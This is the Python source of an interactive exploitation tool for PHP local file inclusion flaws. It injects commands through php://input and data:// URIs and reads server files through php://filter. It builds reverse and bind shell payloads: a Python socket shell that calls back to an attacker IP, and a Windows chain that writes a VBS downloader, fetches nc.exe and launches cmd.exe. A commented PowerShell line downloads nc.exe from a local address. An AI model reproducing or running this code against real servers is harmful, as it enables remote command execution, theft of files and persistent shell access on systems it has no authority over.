from __future__ import print_function
from bs4 import BeautifulSoup
import urllib2
import urllib
import random
import base64
import string
import sys
import os
import re

# A full LFi exploitation tool. You might have seen plenty of tools online but this is very unique. 
# Uses PHPInput, PHPFilter and DataURI methods
# My own logic and own code ;)

class lfi(object):
	def __init__(self, url=None, cookie=None, command=None, files=None, isShell=False):
		self._url = str(url)
		self._cookie = cookie
		self._command =  command
		self._files = files
		self._isShell = isShell

	@property
	def url(self):
		return self._url
	
	@property
	def cookie(self):
		return self._cookie

	@property
	def command(self):
		return self._command	

	@property
	def files(self):
		return self._files

	@property
	def isShell(self):
		return self._isShell

	@url.setter
	def url(self, url):
		self._url = url

	@cookie.setter
	def cookie(self, cookie):
		self._cookie = cookie

	@command.setter
	def command(self, command):
		self._command = command

	@files.setter
	def files(self, files):
		self._files = files

	@isShell.setter
	def isShell(self, isShell):
		self._isShell = isShell
	
	@url.deleter
	def url(self):
		del self._url

	@cookie.deleter
	def cookie(self):
		del self._cookie   

	@command.deleter
	def command(self):
		del self._command 
	
	@files.deleter
	def files(self):
		del self._files 

	def test(self):
		vul = []
		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
		self._command = 'echo '+rnd
		if self.phpInput() == ' \r\n'+rnd+'\r\n' or '\n'+rnd+'\n': vul.append("PHP://input")
		if self.dataURI() == ' \r\n'+rnd+'\r\n' or '\n'+rnd+'\n': vul.append("dataURI")
		print ('[*] Target is vulnerable to: \n')
		for i, j in enumerate(vul, start=1): print (i, j)
		choice = int(input("\n[*] Enter a choice: "))
		if choice == 1:
			com('phpInput')
			print (lfiObj.phpInput())
		if choice == 2:
			com('dataURI')
			print (lfiObj.dataURI())

	def phpInput(self):
		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
		mydata = ("<?php passthru('" + self._command + "'); ?>") if self._isShell else \
		("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd)
		path = self._url + 'php://input'    #the url you want to POST to
		req = urllib2.Request(path, mydata)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(rnd+r'(.+?)'+rnd, html.text, flags=re.DOTALL)
		try: return (match.group(1))
		except: return ("[!] Error Occured")
		page.close()

	def phpFilter(self):
		path = self._url + 'php://filter/convert.base64-encode/resource=' + self._files   #the url you want to POST to
		req = urllib2.Request(path)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)', html.text, flags=re.DOTALL).group()
		try: return str(match).decode('base64')
		except: return ("[!] Error Occured")
		page.close()

	def dataURI(self):
		rnd = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
		payload = ("<?php passthru('echo {0} &" + self._command + "& echo {0}'); ?>").format(rnd).encode('base64').replace('\n','') 
		path = self._url + 'data://text/plain;base64,'+payload   #the url you want to POST to
		req = urllib2.Request(path)
		req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14')
		req.add_header("Content-type", "application/x-www-form-urlencoded")
		if self._cookie: req.add_header('Cookie',self._cookie)
		try: page = urllib2.urlopen(req)
		except urllib2.HTTPError as e: print ('Response code: '+e.code)
		html = BeautifulSoup(page.read(), 'lxml')
		match = re.search(rnd+r'(.+?)'+rnd, html.text, flags=re.DOTALL)
		try: return (match.group(1))
		except: return ("[!] Error Occured")
		page.close()

class Payload(object):
	def __init__(self, url=None, port=None, ip=None, shell=None, location=None):
		self._url = url
		self._port = port
		self._ip = ip
		self._shell = shell
		self._location = location

	@property
	def url(self):
		return self._url
	
	@property
	def port(self):
		return self._port

	@property
	def ip(self):
		return self._ip

	@property
	def shell(self):
		return self._shell
	
	@property
	def location(self):
		return self._location
	
	@url.setter
	def url(self, url):
		self._url = url

	@port.setter
	def port(self, port):
		self._port = port

	@ip.setter
	def ip(self, ip):
		self._ip = ip

	@shell.setter
	def shell(self, shell):
		self._shell = shell	

	@location.setter
	def location(self, location):
		self._location = location

	@url.deleter
	def url(self):
		del self._url

	@port.deleter
	def port(self):
		del self._port 

	@ip.deleter
	def ip(self):
		del self._ip 

	@shell.deleter
	def shell(self):
		del self._shell 

	@location.deleter
	def location(self):
		del self._location

	def payload_windows(self):
		nc=('nc.exe %s') %(self._ip) if self._shell=='reverse' else 'nc.exe -lvvp'
		payload =("del /f /q \"{1}down.vbs\" > nul& \
			del /f /q \"{1}nc.exe\" > nul& \
			echo strFileURL = \"{0}\" > \"{1}down.vbs\"& \
			echo strHDLocation = \"{1}nc.exe\" >> \"{1}down.vbs\"& \
			echo Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> \"{1}down.vbs\"& \
			echo objXMLHTTP.open \"GET\", strFileURL, false >> \"{1}down.vbs\"& \
			echo objXMLHTTP.send() >> \"{1}down.vbs\"& \
			echo If objXMLHTTP.Status = 200 Then >> \"{1}down.vbs\"& \
			echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> \"{1}down.vbs\"& \
			echo objADOStream.Open >> \"{1}down.vbs\"& \
			echo objADOStream.Type = 1 >> \"{1}down.vbs\"& \
			echo objADOStream.Write objXMLHTTP.ResponseBody >> \"{1}down.vbs\"& \
			echo objADOStream.Position = 0 >> \"{1}down.vbs\"& \
			echo Set objFSO = Createobject(\"Scripting.FileSystemObject\") >> \"{1}down.vbs\"& \
			echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> \"{1}down.vbs\"& \
			echo Set objFSO = Nothing >> \"{1}down.vbs\"& \
			echo objADOStream.SaveToFile strHDLocation >> \"{1}down.vbs\"& \
			echo objADOStream.Close >> \"{1}down.vbs\"& \
			echo Set objADOStream = Nothing >> \"{1}down.vbs\"& \
			echo End if >> \"{1}down.vbs\"& \
			echo Set objXMLHTTP = Nothing >> \"{1}down.vbs\"& \
			echo Set objShell=CreateObject(\"WScript.Shell\") >> \"{1}down.vbs\"& \
			echo objShell.Run \"{1}{2} {3} -e \"\"cmd.exe\"\" \", 0, true >> \"{1}down.vbs\"& \
			call \"{1}down.vbs\"& \
			del /f /q \"{1}down.vbs\" > nul& \
			del /f /q \"{1}nc.exe\" > nul").format(
											self._url, 
											self._location, 
											nc, 
											self._port
											)

		return payload

	def payload_linux_python(self):
		if self._shell == 'bind':
			payload=('python -c "import os,pty,socket;\
				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.bind((\\\'\\\',{0}));s.listen(1);\
				(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);\
				os.dup2(rem.fileno(),2);os.putenv(\\\'HISTFILE\\\',\\\'/dev/null\\\');\
				pty.spawn(\\\'/bin/bash\\\');s.close()"').format(self._port)

			return payload

		else:
			payload=('python -c "import socket,subprocess,os; \
				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
				s.connect((\\\'{0}\\\',{1}));os.dup2(s.fileno(),0); \
				os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
				p=subprocess.call([\\\'/bin/sh\\\',\\\'-i\\\']);"').format(self._ip, self._port)

			return payload


def shells(method, shell):
	shellObj = Payload()
	shellObj.shell = str(shell) # bind or reverse
	lfiObj.isShell = True
	print('''
[*] Choose an OS 
1. Windows
2. Linux
''')
	choice = int(input('>> '))
	if choice == 1:
		shellObj.url = str(input("[*] Enter the download URL of netcat (direct link): "))
		shellObj.location = str(input("[*] Enter the location to be saved\n(Press enter for the default location): "))
	if shell == 'reverse':
		shellObj.ip = str(input("[*] Enter your IP: "))
		shellObj.port = str(input("[*] Enter port to connect: "))
		print('[+] Listen on port '+str(shellObj.port))
	else: 
		shellObj.port = str(input("[*] Enter the port to bind: "))
		print('[+] Connect on port '+str(shellObj.port))
	if choice == 1: payload = shellObj.payload_windows()
	if choice == 2: payload = shellObj.payload_linux_python()
	lfiObj.command = payload
		

def com(method):
	if method == 'phpInput':
		bind = "2. Bind Shell"
		rev = "3. Reverse Shell"
	
	else:
		rev = '' 
		bind = ''
	
	menu = ("[?] Choose an option:\n%s\n%s\n%s\n") %("1. Execute command",
													bind,
													rev)
	print(menu)
	choice = int(input(">> "))
	if choice == 1: lfiObj.command = str(input("[*] Enter your command: "))
	elif choice == 2 and method == 'phpInput': shells(method, 'bind')
	elif choice == 3 and method == 'phpInput': shells(method, 'reverse')

#powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {$true}; $source="""http://192.168.1.5/nc.exe """; $destination= """C:\\nc.exe"""; $http = new-object System.Net.WebClient; $response= $http.DownloadFile($source, $destination);"
try: input = raw_input
except: pass

cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

lfiObj = lfi()

def banner():
	print('''

,--.   ,------.,--.
|  |   |  .---'`--'
|  |   |  `--, ,--.
|  '--.|  |`   |  |
`-----'`--'    `--'

		,------.                      ,--.    
		|  .---',--.--. ,---.  ,--,--.|  |,-. 
		|  `--, |  .--'| .-. :' ,-.  ||     / 
		|  |`   |  |   \   --.\ '-'  ||  \  \ 
		`--'    `--'    `----' `--`--'`--'`--'
                                              

[*] Author: Osanda Malith Jayathissa
[*] E-Mail: osanda[cat]unseen.is
[*] Follow @OsandaMalith
[/!\] Use this for educational purposes only!
''')

def main():	
	cls()
	banner()
	try:
		lfiObj.url = str(input("[*] Enter the URL (eg: http://host/lfi.php?page=): "))
		cookie = str(input("[*] Enter the cookie values (press enter if none):\n"))
		if cookie == '': cookie = 0
		lfiObj.cookie = cookie
		while True:
			print ('''
[?] Choose an attacking method: 
1. Automated testing
2. PHP input method
3. PHP filter method
4. Data URI method
5. Exit
''')
			try: choice = int(input(">> "))

			except ValueError:
				print ("[!] Enter only a number")
				continue

			if choice == 1: lfiObj.test()

			elif choice == 2:
				com('phpInput')
				print (lfiObj.phpInput())

			elif choice == 3:
				lfiObj.files =  str(input("Enter the file path: "))
				print (lfiObj.phpFilter())
			
			elif choice == 4:
				com('dataURI')
				print (lfiObj.dataURI())
			
			elif choice == 5: return 0

			else:
				print ("[-] Invalid Choice")
				continue

	except KeyboardInterrupt:
		print ('\n[!] Ctrl + C detected\n[!] Exiting')
		sys.exit(0)
		
	except EOFError:
		print ('\n[!] Ctrl + D detected\n[!] Exiting')
		sys.exit(0)

if __name__ == "__main__": main()  
#EOF
